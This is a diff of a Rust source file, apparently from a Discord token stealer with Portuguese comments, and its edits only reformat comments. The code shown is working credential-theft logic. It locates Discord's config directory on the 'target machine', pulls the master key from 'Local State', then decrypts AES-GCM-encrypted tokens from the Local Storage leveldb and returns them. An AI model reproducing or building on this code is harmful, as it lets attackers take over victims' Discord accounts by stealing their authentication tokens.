@@ -114,10 +114,10 @@ pub fn extract_tokens_from_leveldb(path: &str, master_key: &[u8]) -> Vec<String>
                         let encrypted_token = base64::decode(encrypted_token_b64)
                             .expect("problema ao ler base64 token");
 
-                        let nonce = &encrypted_token[3..15]; // Nonce
-                        let ciphertext = &encrypted_token[15..]; // Ciphertext
+                        let nonce = &encrypted_token[3..15]; //nonce
+                        let ciphertext = &encrypted_token[15..]; //Ciphertext
 
-                        // AES-GCM decryption
+                        //AES-GCM decryption
                         let cipher = Aes256Gcm::new_from_slice(master_key).expect("Failed to create AES key");
                         let nonce = Nonce::from_slice(nonce);
 
@@ -138,21 +138,19 @@ pub fn extract_tokens_from_leveldb(path: &str, master_key: &[u8]) -> Vec<String>
 pub async fn get_discord_tokens() -> Vec<String> {
     let appdata = dirs::config_dir().expect("problema para configurar diretorio").join("discord");
 
-    // Verifica se o diretório do Discord existe
+    //verifica se o diretório do Discord existe
     if !Path::new(&appdata).exists() {
         return vec!["O Discord não está instalado na máquina alvo".to_string()];
     }
 
     let local_state_path = appdata.join("Local State");
 
-    // Aqui lidamos com o Result de get_master_key
     match get_master_key(local_state_path.to_str().unwrap()).await {
         Ok(master_key) => {
             let leveldb_path = appdata.join("Local Storage/leveldb");
-            // Extraímos os tokens utilizando a master key obtida
             extract_tokens_from_leveldb(leveldb_path.to_str().unwrap(), &master_key)
         },
-        Err(_) => vec!["Não foi possível pegar a master key".to_string()],  // Em caso de erro, retornamos uma mensagem
+        Err(_) => vec!["Não foi possível pegar a master key".to_string()],  
     }
 }
 
